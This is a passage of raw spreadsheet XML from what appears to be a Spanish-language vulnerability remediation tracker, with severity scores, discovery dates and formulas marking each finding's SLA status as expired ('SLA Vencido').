        <v>149</v>
      </c>
    </row>
    <row r="119" spans="1:33" ht="304.5" x14ac:dyDescent="0.35">
      <c r="A119" s="5">
        <v>118</v>
      </c>
      <c r="B119" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C119" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D119" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E119" s="4"/>
      <c r="F119" s="4"/>
      <c r="G119" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H119" s="4" t="s">
        <v>471</v>
      </c>
      <c r="I119" s="4" t="s">
        <v>472</v>
      </c>
      <c r="J119" s="4" t="s">
        <v>473</v>
      </c>
      <c r="K119" s="4"/>
      <c r="L119" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M119" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N119" s="5">
        <v>6.5</v>
      </c>
      <c r="O119" s="6"/>
      <c r="P119" s="6"/>
      <c r="Q119" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R119" s="4"/>
      <c r="S119" s="22"/>
      <c r="T119" s="8">
        <v>44152</v>
      </c>
      <c r="U119" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2057</v>
      </c>
      <c r="V119" s="8">
        <f t="shared" si="4"/>
        <v>44242</v>
      </c>
      <c r="W119" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X119" s="12"/>
      <c r="Y119" s="11"/>
      <c r="Z119" s="11"/>
      <c r="AA119" s="8">
        <v>44235</v>
      </c>
      <c r="AB119" s="32" t="s">
        <v>474</v>
      </c>
      <c r="AC119" s="32" t="s">
        <v>475</v>
      </c>
      <c r="AD119" s="32" t="s">
        <v>476</v>
      </c>
      <c r="AE119" s="8">
        <v>44219</v>
      </c>
      <c r="AF119" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG119" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="120" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A120" s="5">
        <v>119</v>
      </c>
      <c r="B120" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C120" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D120" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E120" s="4"/>
      <c r="F120" s="4"/>
      <c r="G120" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H120" s="4" t="s">
        <v>477</v>
      </c>
      <c r="I120" s="4" t="s">
        <v>478</v>
      </c>
      <c r="J120" s="4" t="s">
        <v>479</v>
      </c>
      <c r="K120" s="4"/>
      <c r="L120" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M120" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N120" s="5">
        <v>3.7</v>
      </c>
      <c r="O120" s="6"/>
      <c r="P120" s="6"/>
      <c r="Q120" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R120" s="4"/>
      <c r="S120" s="22"/>
      <c r="T120" s="8">
        <v>44152</v>
      </c>
      <c r="U120" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2057</v>
      </c>
      <c r="V120" s="8">
        <f t="shared" si="4"/>
        <v>44272</v>
      </c>
      <c r="W120" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X120" s="12"/>
      <c r="Y120" s="11"/>
      <c r="Z120" s="11"/>
      <c r="AA120" s="8">
        <v>44251</v>
      </c>
      <c r="AB120" s="32" t="s">
        <v>480</v>
      </c>
      <c r="AC120" s="32" t="s">
        <v>481</v>
      </c>
      <c r="AD120" s="32" t="s">
        <v>482</v>
      </c>
      <c r="AE120" s="8">
        <v>44244</v>
      </c>
      <c r="AF120" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG120" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="121" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A121" s="5">
        <v>120</v>
      </c>
      <c r="B121" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C121" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D121" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E121" s="4"/>
      <c r="F121" s="4"/>
      <c r="G121" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H121" s="4" t="s">
        <v>483</v>
      </c>
      <c r="I121" s="4" t="s">
        <v>484</v>
      </c>
      <c r="J121" s="4" t="s">
        <v>485</v>
      </c>
      <c r="K121" s="4"/>
      <c r="L121" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M121" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N121" s="5">
        <v>3.7</v>
      </c>
      <c r="O121" s="6"/>
      <c r="P121" s="6"/>
      <c r="Q121" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R121" s="4"/>
      <c r="S121" s="22"/>
      <c r="T121" s="8">
        <v>44152</v>
      </c>
      <c r="U121" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2057</v>
      </c>
      <c r="V121" s="8">
        <f t="shared" si="4"/>
        <v>44272</v>
      </c>
      <c r="W121" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X121" s="12"/>
      <c r="Y121" s="11"/>
      <c r="Z121" s="11"/>
      <c r="AA121" s="8">
        <v>44235</v>
      </c>
      <c r="AB121" s="32" t="s">
        <v>486</v>
      </c>
      <c r="AC121" s="32" t="s">
        <v>487</v>
      </c>
      <c r="AD121" s="32" t="s">
        <v>488</v>
      </c>
      <c r="AE121" s="8">
        <v>44219</v>
      </c>
      <c r="AF121" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG121" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="122" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A122" s="5">
        <v>121</v>
      </c>
      <c r="B122" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C122" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D122" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E122" s="4"/>
      <c r="F122" s="4"/>
      <c r="G122" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H122" s="9" t="s">
        <v>489</v>
      </c>
      <c r="I122" s="4" t="s">
        <v>490</v>
      </c>
      <c r="J122" s="4" t="s">
        <v>491</v>
      </c>
      <c r="K122" s="4"/>
      <c r="L122" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M122" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N122" s="5">
        <v>5.3</v>
      </c>
      <c r="O122" s="6"/>
      <c r="P122" s="6"/>
      <c r="Q122" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R122" s="4"/>
      <c r="S122" s="22"/>
      <c r="T122" s="8">
        <v>44146</v>
      </c>
      <c r="U122" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2063</v>
      </c>
      <c r="V122" s="8">
        <f t="shared" si="4"/>
        <v>44236</v>
      </c>
      <c r="W122" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X122" s="12"/>
      <c r="Y122" s="11"/>
      <c r="Z122" s="11"/>
      <c r="AA122" s="8">
        <v>44784</v>
      </c>
      <c r="AB122" s="32" t="s">
        <v>492</v>
      </c>
      <c r="AC122" s="32" t="s">
        <v>424</v>
      </c>
      <c r="AD122" s="32" t="s">
        <v>423</v>
      </c>
      <c r="AE122" s="27" t="s">
        <v>449</v>
      </c>
      <c r="AF122" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG122" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="123" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A123" s="5">
        <v>122</v>
      </c>
      <c r="B123" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C123" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D123" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E123" s="4"/>
      <c r="F123" s="4"/>
      <c r="G123" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H123" s="4" t="s">
        <v>493</v>
      </c>
      <c r="I123" s="4"/>
      <c r="J123" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K123" s="4"/>
      <c r="L123" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M123" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N123" s="5"/>
      <c r="O123" s="6"/>
      <c r="P123" s="6"/>
      <c r="Q123" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R123" s="4"/>
      <c r="S123" s="22"/>
      <c r="T123" s="8">
        <v>44153</v>
      </c>
      <c r="U123" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2056</v>
      </c>
      <c r="V123" s="8">
        <f t="shared" si="4"/>
        <v>44243</v>
      </c>
      <c r="W123" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X123" s="12"/>
      <c r="Y123" s="11"/>
      <c r="Z123" s="11"/>
      <c r="AA123" s="8">
        <v>44154</v>
      </c>
      <c r="AB123" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC123" s="32" t="s">
        <v>496</v>
      </c>
      <c r="AD123" s="32"/>
      <c r="AE123" s="8"/>
      <c r="AF123" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG123" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="124" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A124" s="5">
        <v>123</v>
      </c>
      <c r="B124" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C124" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D124" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E124" s="4"/>
      <c r="F124" s="4"/>
      <c r="G124" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H124" s="4" t="s">
        <v>498</v>
      </c>
      <c r="I124" s="4"/>
      <c r="J124" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K124" s="4"/>
      <c r="L124" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M124" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N124" s="5"/>
      <c r="O124" s="6"/>
      <c r="P124" s="6"/>
      <c r="Q124" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R124" s="4"/>
      <c r="S124" s="22"/>
      <c r="T124" s="8">
        <v>44153</v>
      </c>
      <c r="U124" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2056</v>
      </c>
      <c r="V124" s="8">
        <f t="shared" si="4"/>
        <v>44243</v>
      </c>
      <c r="W124" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X124" s="12"/>
      <c r="Y124" s="11"/>
      <c r="Z124" s="11"/>
      <c r="AA124" s="8">
        <v>44154</v>
      </c>
      <c r="AB124" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC124" s="32" t="s">
        <v>496</v>
      </c>
      <c r="AD124" s="32"/>
      <c r="AE124" s="8"/>
      <c r="AF124" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG124" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="125" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A125" s="5">
        <v>124</v>
      </c>
      <c r="B125" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C125" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D125" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E125" s="4"/>
      <c r="F125" s="4"/>
      <c r="G125" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H125" s="4" t="s">
        <v>499</v>
      </c>
      <c r="I125" s="4"/>
      <c r="J125" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K125" s="4"/>
      <c r="L125" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M125" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N125" s="5"/>
      <c r="O125" s="6"/>
      <c r="P125" s="6"/>
      <c r="Q125" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R125" s="4"/>
      <c r="S125" s="22"/>
      <c r="T125" s="8">
        <v>44153</v>
      </c>
      <c r="U125" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2056</v>
      </c>
      <c r="V125" s="8">
        <f t="shared" si="4"/>
        <v>44243</v>
      </c>
      <c r="W125" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X125" s="12"/>
      <c r="Y125" s="11"/>
      <c r="Z125" s="11"/>
      <c r="AA125" s="8">
        <v>44154</v>
      </c>
      <c r="AB125" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC125" s="32" t="s">
        <v>496</v>
      </c>
      <c r="AD125" s="32"/>
      <c r="AE125" s="8"/>
      <c r="AF125" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG125" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="126" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A126" s="5">
        <v>125</v>
      </c>
      <c r="B126" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C126" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D126" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E126" s="4"/>
      <c r="F126" s="4"/>
      <c r="G126" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H126" s="4" t="s">
        <v>500</v>
      </c>
      <c r="I126" s="4"/>
      <c r="J126" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K126" s="4"/>
      <c r="L126" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M126" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N126" s="5"/>
      <c r="O126" s="6"/>
      <c r="P126" s="6"/>
      <c r="Q126" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R126" s="4"/>
      <c r="S126" s="22"/>
      <c r="T126" s="8">
        <v>44153</v>
      </c>
      <c r="U126" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2056</v>
      </c>
      <c r="V126" s="8">
        <f t="shared" si="4"/>
        <v>44243</v>
      </c>
      <c r="W126" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X126" s="12"/>
      <c r="Y126" s="11"/>
      <c r="Z126" s="11"/>
      <c r="AA126" s="8">
        <v>44154</v>
      </c>
      <c r="AB126" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC126" s="32" t="s">
        <v>496</v>
      </c>
      <c r="AD126" s="32"/>
      <c r="AE126" s="8"/>
      <c r="AF126" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG126" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="127" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A127" s="5">
        <v>126</v>
      </c>
      <c r="B127" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C127" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D127" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E127" s="4"/>
      <c r="F127" s="4"/>
      <c r="G127" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H127" s="4" t="s">
        <v>501</v>
      </c>
      <c r="I127" s="4"/>
      <c r="J127" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K127" s="4"/>
      <c r="L127" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M127" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N127" s="5"/>
      <c r="O127" s="6"/>
      <c r="P127" s="6"/>
      <c r="Q127" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R127" s="4"/>
      <c r="S127" s="22"/>
      <c r="T127" s="8">
        <v>44153</v>
      </c>
      <c r="U127" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2056</v>
      </c>
      <c r="V127" s="8">
        <f t="shared" si="4"/>
        <v>44243</v>
      </c>
      <c r="W127" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X127" s="12"/>
      <c r="Y127" s="11"/>
      <c r="Z127" s="11"/>
      <c r="AA127" s="8">
        <v>44154</v>
      </c>
      <c r="AB127" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC127" s="32" t="s">
        <v>496</v>
      </c>
      <c r="AD127" s="32"/>
      <c r="AE127" s="8"/>
      <c r="AF127" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG127" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="128" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A128" s="5">
        <v>127</v>
      </c>
      <c r="B128" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C128" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D128" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E128" s="4"/>
      <c r="F128" s="4"/>
      <c r="G128" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H128" s="4" t="s">
        <v>502</v>
      </c>
      <c r="I128" s="4"/>
      <c r="J128" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K128" s="4"/>
      <c r="L128" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M128" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N128" s="5"/>
      <c r="O128" s="6"/>
      <c r="P128" s="6"/>
      <c r="Q128" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R128" s="4"/>
      <c r="S128" s="22"/>
      <c r="T128" s="8">
        <v>44153</v>
      </c>
      <c r="U128" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2056</v>
      </c>
      <c r="V128" s="8">
        <f t="shared" si="4"/>
        <v>44243</v>
      </c>
      <c r="W128" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X128" s="12"/>
      <c r="Y128" s="11"/>
      <c r="Z128" s="11"/>
      <c r="AA128" s="8">
        <v>44154</v>
      </c>
      <c r="AB128" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC128" s="32" t="s">
        <v>496</v>
      </c>
      <c r="AD128" s="32"/>
      <c r="AE128" s="8"/>
      <c r="AF128" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG128" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="129" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A129" s="5">
        <v>128</v>
      </c>
      <c r="B129" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C129" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D129" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E129" s="4"/>
      <c r="F129" s="4"/>
      <c r="G129" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H129" s="4" t="s">
        <v>503</v>
      </c>
      <c r="I129" s="4"/>
      <c r="J129" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K129" s="4"/>
      <c r="L129" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M129" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N129" s="5"/>
      <c r="O129" s="6"/>
      <c r="P129" s="6"/>
      <c r="Q129" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R129" s="4"/>
      <c r="S129" s="22"/>
      <c r="T129" s="8">
        <v>44153</v>
      </c>
      <c r="U129" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2056</v>
      </c>
      <c r="V129" s="8">
        <f t="shared" si="4"/>
        <v>44243</v>
      </c>
      <c r="W129" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X129" s="12"/>
      <c r="Y129" s="11"/>
      <c r="Z129" s="11"/>
      <c r="AA129" s="8">
        <v>44154</v>
      </c>
      <c r="AB129" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC129" s="32" t="s">
        <v>496</v>
      </c>
      <c r="AD129" s="32"/>
      <c r="AE129" s="8"/>
      <c r="AF129" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG129" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="130" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A130" s="5">
        <v>129</v>
      </c>
      <c r="B130" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C130" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D130" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E130" s="4"/>
      <c r="F130" s="4"/>
      <c r="G130" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H130" s="4" t="s">
        <v>504</v>
      </c>
      <c r="I130" s="4"/>
      <c r="J130" s="4" t="s">
        <v>437</v>
      </c>
      <c r="K130" s="4"/>
      <c r="L130" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M130" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N130" s="5"/>
      <c r="O130" s="6"/>
      <c r="P130" s="6"/>
      <c r="Q130" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R130" s="4"/>
      <c r="S130" s="22"/>
      <c r="T130" s="8">
        <v>44195</v>
      </c>
      <c r="U130" s="11">
        <f t="shared" ref="U130:U193" ca="1" si="6">TODAY()-T130</f>
        <v>2014</v>
      </c>
      <c r="V130" s="8">
        <f t="shared" ref="V130:V193" si="7">IF(M130="Critical",T130+10,IF(M130="High",T130+30,IF(M130="Bad",T130+30,IF(M130="Medium",T130+90,IF(M130="Warm",T130+90,IF(M130="Low",T130+120,IF(M130="Fair",T130+120,IF(M130="Neutral",T130+120,""))))))))</f>
        <v>44285</v>
      </c>
      <c r="W130" s="12" t="str">
        <f t="shared" ref="W130:W193" ca="1" si="8">IF(M130="Critical",IF(U130&gt;10,"SLA Vencido","En SLA"),IF(M130="High",IF(U130&gt;30,"SLA Vencido","En SLA"),IF(M130="Bad",IF(U130&gt;30,"SLA Vencido","En SLA"),IF(M130="Medium",IF(U130&gt;90,"SLA Vencido","En SLA"),IF(M130="Warm",IF(U130&gt;90,"SLA Vencido","En SLA"),IF(M130="Low",IF(U130&gt;120,"SLA Vencido","En SLA"),IF(M130="Fair",IF(U130&gt;120,"SLA Vencido","En SLA"),IF(M130="Neutral",IF(U130&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X130" s="12"/>
      <c r="Y130" s="11"/>
      <c r="Z130" s="11"/>
      <c r="AA130" s="8">
        <v>44257</v>
      </c>
      <c r="AB130" s="32" t="s">
        <v>505</v>
      </c>
      <c r="AC130" s="32" t="s">
        <v>506</v>
      </c>
      <c r="AD130" s="32"/>
      <c r="AE130" s="8">
        <v>44267</v>
      </c>
      <c r="AF130" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG130" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="131" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A131" s="5">
        <v>130</v>
      </c>
      <c r="B131" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C131" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D131" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E131" s="4"/>
      <c r="F131" s="4"/>
      <c r="G131" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H131" s="4" t="s">
        <v>507</v>
      </c>
      <c r="I131" s="4"/>
      <c r="J131" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K131" s="4"/>
      <c r="L131" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M131" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N131" s="5"/>
      <c r="O131" s="6"/>
      <c r="P131" s="6"/>
      <c r="Q131" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R131" s="4"/>
      <c r="S131" s="22"/>
      <c r="T131" s="8">
        <v>44195</v>
      </c>
      <c r="U131" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2014</v>
      </c>
      <c r="V131" s="8">
        <f t="shared" si="7"/>
        <v>44315</v>
      </c>
      <c r="W131" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X131" s="12"/>
      <c r="Y131" s="11"/>
      <c r="Z131" s="11"/>
      <c r="AA131" s="8">
        <v>44459</v>
      </c>
      <c r="AB131" s="32" t="s">
        <v>508</v>
      </c>
      <c r="AC131" s="32" t="s">
        <v>461</v>
      </c>
      <c r="AD131" s="32"/>
      <c r="AE131" s="8">
        <v>44427</v>
      </c>
      <c r="AF131" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG131" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="132" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A132" s="5">
        <v>131</v>
      </c>
      <c r="B132" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C132" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D132" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E132" s="4"/>
      <c r="F132" s="4"/>
      <c r="G132" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H132" s="4" t="s">
        <v>509</v>
      </c>
      <c r="I132" s="4"/>
      <c r="J132" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K132" s="4"/>
      <c r="L132" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M132" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N132" s="5"/>
      <c r="O132" s="6"/>
      <c r="P132" s="6"/>
      <c r="Q132" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R132" s="4"/>
      <c r="S132" s="22"/>
      <c r="T132" s="8">
        <v>44204</v>
      </c>
      <c r="U132" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2005</v>
      </c>
      <c r="V132" s="8">
        <f t="shared" si="7"/>
        <v>44294</v>
      </c>
      <c r="W132" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X132" s="12"/>
      <c r="Y132" s="11"/>
      <c r="Z132" s="11"/>
      <c r="AA132" s="8">
        <v>44242</v>
      </c>
      <c r="AB132" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC132" s="32" t="s">
        <v>510</v>
      </c>
      <c r="AD132" s="32"/>
      <c r="AE132" s="8">
        <v>44247</v>
      </c>
      <c r="AF132" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG132" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="133" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A133" s="5">
        <v>132</v>
      </c>
      <c r="B133" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C133" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D133" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E133" s="4"/>
      <c r="F133" s="4"/>
      <c r="G133" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H133" s="4" t="s">
        <v>511</v>
      </c>
      <c r="I133" s="4"/>
      <c r="J133" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K133" s="4"/>
      <c r="L133" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M133" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N133" s="5"/>
      <c r="O133" s="6"/>
      <c r="P133" s="6"/>
      <c r="Q133" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R133" s="4"/>
      <c r="S133" s="22"/>
      <c r="T133" s="8">
        <v>44204</v>
      </c>
      <c r="U133" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2005</v>
      </c>
      <c r="V133" s="8">
        <f t="shared" si="7"/>
        <v>44294</v>
      </c>
      <c r="W133" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X133" s="12"/>
      <c r="Y133" s="11"/>
      <c r="Z133" s="11"/>
      <c r="AA133" s="8">
        <v>44242</v>
      </c>
      <c r="AB133" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC133" s="32" t="s">
        <v>510</v>
      </c>
      <c r="AD133" s="32"/>
      <c r="AE133" s="8">
        <v>44247</v>
      </c>
      <c r="AF133" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG133" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="134" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A134" s="5">
        <v>133</v>
      </c>
      <c r="B134" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C134" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D134" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E134" s="4"/>
      <c r="F134" s="4"/>
      <c r="G134" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H134" s="4" t="s">
        <v>512</v>
      </c>
      <c r="I134" s="4"/>
      <c r="J134" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K134" s="4"/>
      <c r="L134" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M134" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N134" s="5"/>
      <c r="O134" s="6"/>
      <c r="P134" s="6"/>
      <c r="Q134" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R134" s="4"/>
      <c r="S134" s="22"/>
      <c r="T134" s="8">
        <v>44204</v>
      </c>
      <c r="U134" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2005</v>
      </c>
      <c r="V134" s="8">
        <f t="shared" si="7"/>
        <v>44294</v>
      </c>
      <c r="W134" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X134" s="12"/>
      <c r="Y134" s="11"/>
      <c r="Z134" s="11"/>
      <c r="AA134" s="8">
        <v>44242</v>
      </c>
      <c r="AB134" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC134" s="32" t="s">
        <v>510</v>
      </c>
      <c r="AD134" s="32"/>
